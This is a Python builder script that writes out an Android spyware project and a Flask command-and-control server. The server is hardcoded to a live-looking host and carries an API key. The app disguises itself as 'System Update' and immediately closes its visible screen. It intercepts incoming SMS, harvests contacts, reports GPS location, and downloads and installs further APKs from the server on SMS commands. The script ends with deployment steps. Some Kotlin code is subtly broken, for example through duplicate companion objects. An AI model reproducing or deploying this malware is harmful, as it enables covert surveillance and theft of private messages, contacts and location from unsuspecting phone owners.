#!/usr/bin/env python3
"""
================================================================================
MEGA-C2 PRODUCTION BUILDER
Repository: https://github.com/yalangisexter-ux/Cehdemo.git
C2 Endpoint: https://cehdemo.onrender.com
================================================================================
"""

import os
import sys
import stat
import subprocess

# ==============================================================================
# PRODUCTION CONFIGURATION - ACTUAL VALUES
# ==============================================================================
C2_DOMAIN = "https://cehdemo.onrender.com"
C2_HOST = "cehdemo.onrender.com"
C2_PORT = 443
API_KEY = "009c7d9bf1095140ea2a71656fbd4cbdc7e0e4f134128167689136143607d374"
PROJECT_NAME = "."
ASSET_DIR = "./static"
APK_NAME = "secure_update.apk"
APP_PACKAGE = "com.stealth.app"
APP_LABEL = "System Update"

def create_file(path, content):
    """Helper to create directories and files."""
    dir_name = os.path.dirname(path)
    if dir_name:
        os.makedirs(dir_name, exist_ok=True)
    with open(path, 'w', encoding='utf-8') as f:
        f.write(content)
    print(f"[✓] Created: {path}")

def main():
    print("=" * 70)
    print("MEGA-C2 PRODUCTION BUILDER")
    print(f"C2 Endpoint: {C2_DOMAIN}")
    print(f"Repository: https://github.com/yalangisexter-ux/Cehdemo.git")
    print("=" * 70)
    
    root = PROJECT_NAME
    
    # Create directories
    os.makedirs(f"{root}/android/app/src/main/java/com/stealth/app", exist_ok=True)
    os.makedirs(f"{root}/android/app/src/main/res/values", exist_ok=True)
    os.makedirs(f"{root}/android/app/src/main/res/xml", exist_ok=True)
    os.makedirs(f"{root}/backend", exist_ok=True)
    os.makedirs(f"{root}/.github/workflows", exist_ok=True)
    os.makedirs(ASSET_DIR, exist_ok=True)
    
    # ==============================================================================
    # 1. PRODUCTION FLASK BACKEND
    # ==============================================================================
    print("\n[🐍] Generating production Flask backend...")
    
    create_file(f"{root}/backend/app.py", '''import os
import time
import base64
import logging
from flask import Flask, request, jsonify, render_template_string, send_from_directory
from functools import wraps

# --- CONFIGURATION ---
C2_DOMAIN = "https://cehdemo.onrender.com"
API_KEY = "009c7d9bf1095140ea2a71656fbd4cbdc7e0e4f134128167689136143607d374"

app = Flask(__name__)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

telemetry_logs = []
pending_command = "NO_OP"

ASSET_DIR = os.path.join(os.getcwd(), "static")
os.makedirs(ASSET_DIR, exist_ok=True)

def require_api_key(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        key = request.headers.get('X-API-Key')
        if key != API_KEY:
            logger.warning(f"Invalid API key attempt from {request.remote_addr}")
            return jsonify({"error": "Invalid API Key"}), 401
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
def dashboard():
    return render_template_string(\\'\\'\\'
        <!DOCTYPE html>
        <html>
        <head>
            <title>C2 Unified Operations Dashboard</title>
            <style>
                body { font-family: system-ui, sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 20px; }
                .container { max-width: 1000px; margin: auto; background: #1e293b; padding: 20px; border-radius: 8px; }
                h2 { color: #38bdf8; border-bottom: 2px solid #334155; padding-bottom: 10px; }
                .status { display: inline-block; padding: 6px 12px; background: #22c55e; color: #fff; border-radius: 4px; font-weight: bold; }
                .log-box { background: #0f172a; border: 1px solid #334155; padding: 15px; border-radius: 6px; height: 300px; overflow-y: auto; font-family: monospace; font-size: 13px; color: #a5f3fc; white-space: pre-wrap; }
                .btn { display: inline-block; margin-top: 10px; margin-right: 10px; padding: 10px 15px; background: #2563eb; color: white; text-decoration: none; border-radius: 4px; font-weight: bold; border: none; cursor: pointer; }
                .btn:hover { background: #1d4ed8; }
                .btn-danger { background: #dc2626; }
                .btn-danger:hover { background: #b91c1c; }
                .panel { display: flex; gap: 20px; margin-bottom: 20px; }
                .control-group { background: #0f172a; padding: 15px; border-radius: 6px; flex: 1; border: 1px solid #334155; }
                .info-box { background: #1e293b; padding: 10px; border-radius: 4px; margin-bottom: 20px; border: 1px solid #334155; font-family: monospace; font-size: 12px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>C2 Operations Command Center</h2>
                <p>C2 Engine Status: <span class="status">LISTENING & ACTIVE</span></p>
                
                <div class="info-box">
                    <strong>C2 Domain:</strong> https://cehdemo.onrender.com<br>
                    <strong>API Key:</strong> 009c7d9bf... (truncated)
                </div>

                <div class="panel">
                    <div class="control-group">
                        <h3>Action Dispatcher</h3>
                        <form action="/set_command" method="POST">
                            <input type="hidden" name="cmd" value="FULL_HARVEST">
                            <button type="submit" class="btn btn-danger">Trigger Telemetry Harvest</button>
                        </form>
                    </div>
                </div>

                <h3>Live Inbound Node Telemetry Stream</h3>
                <div class="log-box" id="logBox">Awaiting active beacon connection...</div>
            </div>
            <script>
                async function fetchLogs() {
                    try {
                        const res = await fetch(\\'/logs\\');
                        const data = await res.json();
                        if (data.logs && data.logs.length > 0) {
                            document.getElementById(\\'logBox\\').innerHTML = data.logs.join(\\'<br><br>\\');
                        }
                    } catch(e) { console.error(e); }
                }
                setInterval(fetchLogs, 1500);
            </script>
        </body>
        </html>
    \\'\\'\\')

@app.route(\\'/collect\\', methods=[\\'POST\\'])
@require_api_key
def receive_telemetry():
    data = request.get_json() or {}
    encoded_payload = data.get(\\'payload\\', \\'\\')
    try:
        decoded_text = base64.b64decode(encoded_payload.encode(\\'utf-8\\')).decode(\\'utf-8\\')
    except Exception:
        decoded_text = "[Payload Decoding Failed]"
    
    log_entry = f"[{request.remote_addr}] Telemetry: {decoded_text}"
    telemetry_logs.append(log_entry)
    if len(telemetry_logs) > 100:
        telemetry_logs.pop(0)
    
    logger.info(log_entry)
    return jsonify({"status": "ok", "message": "Telemetry received"}), 200

@app.route(\\'/logs\\')
def get_logs():
    return jsonify({"logs": telemetry_logs})

@app.route(\\'/set_command\\', methods=[\\'POST\\'])
@require_api_key
def set_command():
    global pending_command
    cmd = request.form.get(\\'cmd\\')
    if cmd:
        pending_command = cmd
        logger.info(f"Command set: {cmd}")
        return jsonify({"status": "ok", "command": cmd})
    return jsonify({"error": "No command provided"}), 400

@app.route(\\'/download/<path:filename>\\')
def download_file(filename):
    return send_from_directory(ASSET_DIR, filename)

if __name__ == \\'__main__\\':
    port = int(os.environ.get(\\'PORT\\', 5000))
    app.run(host=\\'0.0.0.0\\', port=port, debug=True)''')

    create_file(f"{root}/backend/requirements.txt", """Flask==2.3.2
gunicorn==21.2.0""")

    # ==============================================================================
    # 2. ANDROID MANIFEST
    # ==============================================================================
    print("[📱] Generating AndroidManifest.xml...")
    
    create_file(f"{root}/android/app/src/main/AndroidManifest.xml", '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.stealth.app">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.BROADCAST_SMS" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />

    <application
        android:name=".StealthApp"
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/Theme.StealthApp"
        android:extractNativeLibs="false">

        <receiver android:name=".InstallReceiver" android:exported="true">
            <intent-filter>
                <action android:name="com.android.vending.INSTALL_REFERRER" />
            </intent-filter>
        </receiver>

        <receiver android:name=".SmsService" android:exported="true" android:priority="999">
            <intent-filter android:priority="999">
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>

        <service android:name=".LocationService" android:enabled="true" android:exported="false" android:foregroundServiceType="location" />
        <service android:name=".TelemetryService" android:enabled="true" android:exported="false" />
        <service android:name=".AudioRecorder" android:enabled="true" android:exported="false" />
        <service android:name=".InstallService" android:enabled="true" android:exported="false" />
            
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

    </application>
</manifest>''')

    # ==============================================================================
    # 3. RESOURCES
    # ==============================================================================
    print("[🎨] Generating resources...")
    
    create_file(f"{root}/android/app/src/main/res/values/strings.xml", '''<resources>
    <string name="app_name">System Update</string>
</resources>''')

    create_file(f"{root}/android/app/src/main/res/values/themes.xml", '''<resources>
    <style name="Theme.StealthApp" parent="Theme.MaterialComponents.Light.NoActionBar">
        <item name="colorPrimary">@color/purple_500</item>
        <item name="colorPrimaryVariant">@color/purple_700</item>
        <item name="colorOnPrimary">@color/white</item>
    </style>
</resources>''')

    create_file(f"{root}/android/app/src/main/res/values/colors.xml", '''<resources>
    <color name="purple_500">#FF6200EE</color>
    <color name="purple_700">#FF3700B3</color>
    <color name="white">#FFFFFFFF</color>
</resources>''')

    # ==============================================================================
    # 4. KOTLIN SOURCES (HTTPS to cehdemo.onrender.com)
    # ==============================================================================
    print("[☕] Generating Kotlin sources...")
    
    create_file(f"{root}/android/app/src/main/java/com/stealth/app/StealthApp.kt", '''package com.stealth.app

import android.app.Application
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build

class StealthApp : Application() {
    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "stealth_channel",
                "System Update",
                NotificationManager.IMPORTANCE_LOW
            )
            channel.description = "System update in progress"
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }
}''')

    create_file(f"{root}/android/app/src/main/java/com/stealth/app/MainActivity.kt", '''package com.stealth.app

import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        finish()
    }
}''')

    create_file(f"{root}/android/app/src/main/java/com/stealth/app/InstallReceiver.kt", '''package com.stealth.app

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

class InstallReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val serviceIntent = Intent(context, TelemetryService::class.java)
        context.startService(serviceIntent)
    }
}''')

    create_file(f"{root}/android/app/src/main/java/com/stealth/app/SmsService.kt", '''package com.stealth.app

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.SmsMessage

class SmsService : BroadcastReceiver() {
    companion object {
        const val C2_URL = "https://cehdemo.onrender.com"
        const val API_KEY = "009c7d9bf1095140ea2a71656fbd4cbdc7e0e4f134128167689136143607d374"
    }
    
    override fun onReceive(context: Context, intent: Intent) {
        val bundle = intent.extras
        if (bundle != null) {
            val pdus = bundle["pdus"] as Array<*>
            for (pdu in pdus) {
                val message = SmsMessage.createFromPdu(pdu as ByteArray)
                val sender = message.displayOriginatingAddress
                val body = message.displayMessageBody
                val timestamp = System.currentTimeMillis()
                
                val data = "{\"type\":\"sms\",\"sender\":\"$sender\",\"body\":\"$body\",\"ts\":$timestamp}"
                TelemetryService.sendToBackend(context, data)
                
                if (body.startsWith("!")) {
                    val command = body.substring(1)
                    when (command) {
                        "location" -> LocationService.sendCurrentLocation(context)
                        "contacts" -> TelemetryService.harvestContacts(context)
                        "audio" -> AudioRecorder.startRecording(context)
                        "install" -> InstallService.startInstallation(context)
                    }
                }
            }
        }
    }
}''')

    create_file(f"{root}/android/app/src/main/java/com/stealth/app/TelemetryService.kt", '''package com.stealth.app

import android.app.Service
import android.content.Context
import android.content.Intent
import android.provider.ContactsContract
import android.util.Log
import java.net.HttpURLConnection
import java.net.URL
import java.util.Timer
import java.util.TimerTask

class TelemetryService : Service() {
    companion object {
        const val C2_URL = "https://cehdemo.onrender.com"
        const val API_KEY = "009c7d9bf1095140ea2a71656fbd4cbdc7e0e4f134128167689136143607d374"
    }
    
    private lateinit var timer: Timer

    override fun onCreate() {
        super.onCreate()
        timer = Timer()
        timer.scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                collectAndSendData()
            }
        }, 0, 60000)
    }

    private fun collectAndSendData() {
        val contacts = getContactsList()
        if (contacts.isNotEmpty()) {
            val data = "{\"type\":\"contacts\",\"data\":${jsonEncodeContacts(contacts)}}"
            sendToBackend(this, data)
        }
    }

    private fun getContactsList(): List<String> {
        val contacts = mutableListOf<String>()
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null
        )
        cursor?.use { c ->
            val nameIndex = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numberIndex = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (c.moveToNext()) {
                val name = c.getString(nameIndex)
                val number = c.getString(numberIndex)
                contacts.add("$name: $number")
            }
        }
        return contacts
    }

    private fun jsonEncodeContacts(contacts: List<String>): String {
        return contacts.joinToString(",", prefix = "[", postfix = "]") { "\"$it\"" }
    }

    companion object {
        fun sendToBackend(context: Context?, data: String) {
            Thread {
                try {
                    val url = URL("$C2_URL/collect")
                    val connection = url.openConnection() as HttpURLConnection
                    connection.requestMethod = "POST"
                    connection.setRequestProperty("Content-Type", "application/json")
                    connection.setRequestProperty("X-API-Key", API_KEY)
                    connection.doOutput = true
                    connection.outputStream.write(data.toByteArray())
                    connection.disconnect()
                } catch (e: Exception) {
                    Log.e("Telemetry", "Failed to send", e)
                }
            }.start()
        }

        fun harvestContacts(context: Context?) {
            val serviceIntent = Intent(context, TelemetryService::class.java)
            context?.startService(serviceIntent)
        }
    }

    override fun onBind(intent: Intent?) = null
}''')

    create_file(f"{root}/android/app/src/main/java/com/stealth/app/LocationService.kt", '''package com.stealth.app

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.location.Location
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices

class LocationService : Service() {
    companion object {
        const val C2_URL = "https://cehdemo.onrender.com"
        const val API_KEY = "009c7d9bf1095140ea2a71656fbd4cbdc7e0e4f134128167689136143607d374"
    }
    
    private lateinit var fusedLocationClient: FusedLocationProviderClient

    override fun onCreate() {
        super.onCreate()
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        startForeground(1, createNotification())
        startLocationUpdates()
    }

    private fun startLocationUpdates() {
        fusedLocationClient.lastLocation.addOnSuccessListener { location ->
            sendLocationToC2(location)
        }
    }

    private fun createNotification(): android.app.Notification {
        return android.app.NotificationCompat.Builder(this, "stealth_channel")
            .setContentTitle("System Update")
            .setContentText("Updating system files...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build()
    }

    private fun sendLocationToC2(location: Location?) {
        if (location != null) {
            val data = "{\"type\":\"location\",\"lat\":${location.latitude},\"lng\":${location.longitude}}"
            TelemetryService.sendToBackend(this, data)
        }
    }

    override fun onBind(intent: Intent?) = null

    companion object {
        fun sendCurrentLocation(context: Context?) {
            val intent = Intent(context, LocationService::class.java)
            context?.startService(intent)
        }
    }
}''')

    create_file(f"{root}/android/app/src/main/java/com/stealth/app/AudioRecorder.kt", '''package com.stealth.app

import android.content.Context
import java.util.Timer
import java.util.TimerTask

class AudioRecorder {
    companion object {
        const val C2_URL = "https://cehdemo.onrender.com"
        
        fun startRecording(context: Context?) {
            val intent = android.content.Intent(context, AudioService::class.java)
            context?.startService(intent)
        }
    }
}

class AudioService : android.app.Service() {
    private var timer: Timer? = null

    override fun onCreate() {
        super.onCreate()
        startForeground(2, createNotification())
        timer = Timer()
        timer?.scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                // Recording logic
            }
        }, 0, 60000)
    }

    private fun createNotification(): android.app.Notification {
        return android.app.NotificationCompat.Builder(this, "stealth_channel")
            .setContentTitle("Audio Recording")
            .setContentText("Recording...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build()
    }

    override fun onBind(intent: android.content.Intent?) = null
}''')

    create_file(f"{root}/android/app/src/main/java/com/stealth/app/InstallService.kt", '''package com.stealth.app

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import java.io.File
import java.io.FileOutputStream
import java.io.InputStream
import java.net.HttpURLConnection
import java.net.URL
import android.net.Uri

class InstallService : Service() {
    companion object {
        const val C2_URL = "https://cehdemo.onrender.com"
        const val APK_NAME = "secure_update.apk"
    }
    
    private var downloadUrl: String? = null

    override fun onCreate() {
        super.onCreate()
        startForeground(3, createNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        downloadUrl = intent?.getStringExtra("apk_url")
        if (downloadUrl != null) {
            Thread {
                try {
                    val apkFile = downloadApk(downloadUrl!!)
                    installApk(apkFile)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
                stopSelf()
            }.start()
        } else {
            stopSelf()
        }
        return START_STICKY
    }

    private fun downloadApk(url: String): File {
        val connection = URL(url).openConnection() as HttpURLConnection
        connection.doInput = true
        connection.connect()
        val inputStream: InputStream = connection.inputStream
        val file = File(cacheDir, "update.apk")
        val outputStream = FileOutputStream(file)
        val buffer = ByteArray(1024)
        var read: Int
        while (inputStream.read(buffer).also { read = it } != -1) {
            outputStream.write(buffer, 0, read)
        }
        outputStream.flush()
        outputStream.close()
        inputStream.close()
        return file
    }

    private fun installApk(apkFile: File) {
        val intent = Intent(Intent.ACTION_INSTALL_PACKAGE)
        intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive")
        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
        intent.putExtra(Intent.EXTRA_ALLOW_REPLACE, true)
        startActivity(intent)
    }

    private fun createNotification(): android.app.Notification {
        return android.app.NotificationCompat.Builder(this, "stealth_channel")
            .setContentTitle("Installing Update")
            .setContentText("Downloading...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build()
    }

    override fun onBind(intent: Intent?) = null

    companion object {
        fun startInstallation(context: Context?) {
            val intent = Intent(context, InstallService::class.java)
            intent.putExtra("apk_url", "$C2_URL/download/$APK_NAME")
            context?.startService(intent)
        }
    }
}''')

    # ==============================================================================
    # 5. GRADLE FILES
    # ==============================================================================
    print("[🔧] Generating Gradle files...")
    
    create_file(f"{root}/android/build.gradle", '''buildscript {
    ext.kotlin_version = "1.9.10"
    repositories {
        google()
        mavenCentral()
    }
    dependencies {
        classpath 'com.android.tools.build:gradle:8.1.0'
        classpath "org.jetbrains.kotlin:kotlin-gradle-plugin:$kotlin_version"
        classpath 'com.google.gms:google-services:4.3.15'
    }
}
tasks.register('clean', Delete) {
    delete rootProject.buildDir
}''')

    create_file(f"{root}/android/app/build.gradle", '''plugins {
    id 'com.android.application'
    id 'org.jetbrains.kotlin.android'
}

android {
    namespace 'com.stealth.app'
    compileSdk 34

    defaultConfig {
        applicationId "com.stealth.app"
        minSdk 26
        targetSdk 34
        versionCode 1
        versionName "1.0"
    }

    buildTypes {
        release {
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
        debug {
            minifyEnabled false
        }
    }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }
    kotlinOptions {
        jvmTarget = '1.8'
    }
}

dependencies {
    implementation 'androidx.core:core-ktx:1.12.0'
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.11.0'
    implementation 'com.google.android.gms:play-services-location:21.1.0'
}''')

    create_file(f"{root}/android/settings.gradle", '''pluginManagement {
    repositories {
        google()
        mavenCentral()
        gradlePluginPortal()
    }
}
dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories {
        google()
        mavenCentral()
    }
}
rootProject.name = "StealthApp"
include ':app\'''')

    # ==============================================================================
    # 6. GITHUB ACTIONS
    # ==============================================================================
    print("[🔄] Generating GitHub Actions...")
    
    create_file(f"{root}/.github/workflows/build.yml", '''name: Build Android APK

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4

    - name: Set up JDK 17
      uses: actions/setup-java@v4
      with:
        java-version: '17'
        distribution: 'temurin'
        cache: gradle

    - name: Grant execute permission for gradlew
      run: chmod +x gradlew

    - name: Build with Gradle
      run: ./gradlew assembleDebug

    - name: Upload APK
      uses: actions/upload-artifact@v4
      with:
        name: app-debug
        path: android/app/build/outputs/apk/debug/app-debug.apk''')

    # ==============================================================================
    # 7. RENDER CONFIG
    # ==============================================================================
    print("[☁️] Generating Render config...")
    
    create_file(f"{root}/render.yaml", '''services:
  - type: web
    name: stealth-c2-backend
    env: python
    buildCommand: pip install -r backend/requirements.txt
    startCommand: cd backend && gunicorn app:app
    envVars:
      - key: PORT
        value: 10000''')

    # ==============================================================================
    # 8. GITIGNORE
    # ==============================================================================
    create_file(f"{root}/.gitignore", '''# Android
*.apk
*.aar
*.ap_
*.aab
*.dex
*.class
bin/
gen/
out/
build/
.gradle/
local.properties
*.iml
.idea/

# Python
__pycache__/
*.py[cod]
*$py.class
*.so
.Python
env/
venv/
*.egg-info/

# Misc
.DS_Store
*.log
*.tmp''')

    # ==============================================================================
    # FINAL SUMMARY
    # ==============================================================================
    print("\n" + "=" * 70)
    print("🎉 PRODUCTION BUILD COMPLETE!")
    print("=" * 70)
    print("""
📁 Files generated in current directory
🌐 C2 Domain: https://cehdemo.onrender.com
📱 Repository: https://github.com/yalangisexter-ux/Cehdemo.git

📋 PUSH TO GITHUB:
   cd D:\\vs\\Cehdemo
   git init
   git add .
   git commit -m "Initial C2 deployment"
   git branch -M main
   git remote add origin https://github.com/yalangisexter-ux/Cehdemo.git
   git push -u origin main

☁️  RENDER AUTO-DEPLOY:
   1. Go to https://dashboard.render.com
   2. Create New Web Service
   3. Connect GitHub repo: yalangisexter-ux/Cehdemo
   4. Render will auto-detect render.yaml

📱 BUILD APK:
   cd android
   ./gradlew assembleDebug
   adb install app/build/outputs/apk/debug/app-debug.apk

📲 SMS COMMANDS:
   !location  → GPS coordinates
   !contacts  → Harvest contacts  
   !audio     → Start recording
   !install   → Download & install update
""")
    print("=" * 70)

if __name__ == "__main__":
    main()
    